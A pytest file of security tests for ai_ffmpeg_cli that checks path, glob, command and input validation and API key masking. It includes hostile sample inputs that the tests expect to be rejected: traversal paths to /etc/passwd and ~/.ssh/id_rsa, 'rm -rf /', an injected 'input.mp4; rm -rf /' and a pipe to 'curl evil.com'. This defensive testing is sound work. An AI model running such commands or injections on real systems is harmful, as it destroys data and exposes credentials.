"""Security tests for ai_ffmpeg_cli."""

from pathlib import Path

from ai_ffmpeg_cli.io_utils import _is_safe_glob_pattern
from ai_ffmpeg_cli.io_utils import expand_globs
from ai_ffmpeg_cli.io_utils import is_safe_path
from ai_ffmpeg_cli.io_utils import sanitize_filename
from ai_ffmpeg_cli.io_utils import sanitize_user_input
from ai_ffmpeg_cli.io_utils import validate_ffmpeg_command
from ai_ffmpeg_cli.security import SecretStr
from ai_ffmpeg_cli.security import mask_api_key
from ai_ffmpeg_cli.security import sanitize_error_message
from ai_ffmpeg_cli.security import validate_api_key_format


class TestPathSecurity:
    """Test path validation and sanitization."""

    def test_safe_path_current_directory(self):
        """Test that current directory files are allowed."""
        assert is_safe_path("test.mp4")
        assert is_safe_path("./test.mp4")
        assert is_safe_path(Path("test.mp4"))

    def test_unsafe_path_traversal(self):
        """Test that path traversal attempts are blocked."""
        assert not is_safe_path("../../../etc/passwd")
        assert not is_safe_path("..\\..\\windows\\system32")
        assert not is_safe_path("../test.mp4")
        assert not is_safe_path("../../test.mp4")

    def test_unsafe_system_paths(self):
        """Test that system paths are blocked."""
        assert not is_safe_path("/etc/passwd")
        assert not is_safe_path("/proc/version")
        assert not is_safe_path("C:\\Windows\\System32")
        assert not is_safe_path("~/.ssh/id_rsa")

    def test_empty_and_root_paths(self):
        """Test that empty and root paths are blocked."""
        assert not is_safe_path("")
        assert not is_safe_path("/")
        assert not is_safe_path("\\")
        assert not is_safe_path("C:\\")
        assert not is_safe_path(None)

    def test_allowed_directories(self):
        """Test allowed directories functionality."""
        allowed_dirs = [Path("/tmp")]
        assert is_safe_path("/tmp/test.mp4", allowed_dirs)
        assert not is_safe_path("/home/user/test.mp4", allowed_dirs)


class TestGlobSecurity:
    """Test glob pattern validation."""

    def test_safe_glob_patterns(self):
        """Test that normal glob patterns are allowed."""
        assert _is_safe_glob_pattern("*.mp4")
        assert _is_safe_glob_pattern("videos/*.mov")
        assert _is_safe_glob_pattern("**/*.avi")

    def test_unsafe_glob_patterns(self):
        """Test that dangerous glob patterns are blocked."""
        assert not _is_safe_glob_pattern("../../../*")
        assert not _is_safe_glob_pattern("..\\*")
        assert not _is_safe_glob_pattern("/etc/*")
        assert not _is_safe_glob_pattern("C:\\Windows\\*")
        assert not _is_safe_glob_pattern("*" * 20)  # Too many wildcards


class TestCommandValidation:
    """Test ffmpeg command validation."""

    def test_valid_ffmpeg_command(self):
        """Test that normal ffmpeg commands are allowed."""
        cmd = ["ffmpeg", "-i", "input.mp4", "-c:v", "libx264", "output.mp4"]
        assert validate_ffmpeg_command(cmd)

    def test_invalid_executable(self):
        """Test that non-ffmpeg executables are blocked."""
        cmd = ["rm", "-rf", "/"]
        assert not validate_ffmpeg_command(cmd)

    def test_command_injection_attempts(self):
        """Test that command injection attempts are blocked."""
        cmd = ["ffmpeg", "-i", "input.mp4; rm -rf /", "output.mp4"]
        assert not validate_ffmpeg_command(cmd)

        cmd = ["ffmpeg", "-i", "input.mp4", "|", "curl", "evil.com"]
        assert not validate_ffmpeg_command(cmd)

    def test_unsupported_flags(self):
        """Test that unsupported flags are blocked."""
        cmd = ["ffmpeg", "-i", "input.mp4", "--dangerous-flag", "output.mp4"]
        assert not validate_ffmpeg_command(cmd)

    def test_empty_command(self):
        """Test that empty commands are blocked."""
        assert not validate_ffmpeg_command([])
        assert not validate_ffmpeg_command(None)


class TestInputSanitization:
    """Test user input sanitization."""

    def test_normal_input(self):
        """Test that normal input is preserved."""
        input_text = "convert video.mp4 to 720p"
        result = sanitize_user_input(input_text)
        assert result == input_text

    def test_dangerous_characters_removed(self):
        """Test that dangerous characters are removed."""
        input_text = "convert video.mp4; rm -rf /"
        result = sanitize_user_input(input_text)
        assert ";" not in result
        assert "rm" not in result

    def test_control_characters_removed(self):
        """Test that control characters are removed."""
        input_text = "convert\x00video.mp4\x1f"
        result = sanitize_user_input(input_text)
        assert "\x00" not in result
        assert "\x1f" not in result

    def test_length_limit(self):
        """Test that overly long input is truncated."""
        long_input = "A" * 2000
        result = sanitize_user_input(long_input, max_length=100)
        assert len(result) <= 100


class TestFilenameSanitization:
    """Test filename sanitization."""

    def test_normal_filename(self):
        """Test that normal filenames are preserved."""
        filename = "video.mp4"
        result = sanitize_filename(filename)
        assert result == filename

    def test_dangerous_characters_replaced(self):
        """Test that dangerous characters are replaced."""
        filename = 'video<>:"|?*.mp4'
        result = sanitize_filename(filename)
        assert "<" not in result
        assert ">" not in result
        assert ":" not in result

    def test_windows_reserved_names(self):
        """Test that Windows reserved names are handled."""
        filename = "CON.mp4"
        result = sanitize_filename(filename)
        assert result.startswith("safe_")

    def test_path_traversal_in_filename(self):
        """Test that path traversal in filenames is prevented."""
        filename = "../../etc/passwd"
        result = sanitize_filename(filename)
        assert ".." not in result


class TestAPIKeySecurity:
    """Test API key security features."""

    def test_api_key_masking(self):
        """Test that API keys are properly masked."""
        api_key = "sk-1234567890abcdef1234567890abcdef"
        masked = mask_api_key(api_key)
        assert "sk-" in masked
        assert "1234567890abcdef" not in masked
        assert len(masked) < len(api_key)

    def test_api_key_validation(self):
        """Test API key format validation."""
        # Valid format
        assert validate_api_key_format("sk-1234567890abcdefghijklmnopqrstuvwxyzABCDEF")

        # Invalid formats
        assert not validate_api_key_format("invalid-key")
        assert not validate_api_key_format("sk-short")
        assert not validate_api_key_format("")
        assert not validate_api_key_format(None)

    def test_secret_str(self):
        """Test SecretStr wrapper."""
        secret = SecretStr("sk-1234567890abcdef1234567890abcdef")

        # Should not expose secret in string representation
        assert "sk-" not in str(secret)
        assert "SECRET" in str(secret)

        # Should provide access to actual value when needed
        assert secret.get_secret_value().startswith("sk-")

        # Should provide masked version
        masked = secret.mask()
        assert "sk-" in masked
        assert len(masked) < len(secret.get_secret_value())


class TestErrorMessageSanitization:
    """Test error message sanitization."""

    def test_api_key_removed_from_errors(self):
        """Test that API keys are removed from error messages."""
        error_msg = "Authentication failed with key sk-1234567890abcdef"
        sanitized = sanitize_error_message(error_msg)
        assert "sk-1234567890abcdef" not in sanitized
        assert "API_KEY" in sanitized

    def test_user_paths_masked(self):
        """Test that user paths are masked in error messages."""
        error_msg = "File not found: /Users/john/secret/file.mp4"
        sanitized = sanitize_error_message(error_msg)
        assert "john" not in sanitized
        assert "USER" in sanitized

    def test_credentials_masked(self):
        """Test that credentials are masked."""
        error_msg = "password=secret123 token=abc123"
        sanitized = sanitize_error_message(error_msg)
        assert "secret123" not in sanitized
        assert "abc123" not in sanitized
        assert "MASKED" in sanitized


class TestIntegrationSecurity:
    """Integration tests for security features."""

    def test_glob_expansion_security(self):
        """Test that glob expansion respects security constraints."""
        # Should work with safe patterns in allowed directories
        result = expand_globs(["*.py"], [Path.cwd()])
        assert isinstance(result, list)

        # Should reject dangerous patterns
        result = expand_globs(["../../*"], [Path.cwd()])
        assert len(result) == 0  # Should be empty due to safety checks

    def test_path_validation_chain(self):
        """Test the complete path validation chain."""
        # Safe path should pass all validations
        safe_path = "video.mp4"
        assert is_safe_path(safe_path)
        assert sanitize_filename(safe_path) == safe_path

        # Unsafe path should be caught
        unsafe_path = "../../../etc/passwd"
        assert not is_safe_path(unsafe_path)

        # Sanitized version should be safe
        sanitized = sanitize_filename(unsafe_path)
        assert is_safe_path(sanitized) or sanitized == "sanitized_file"
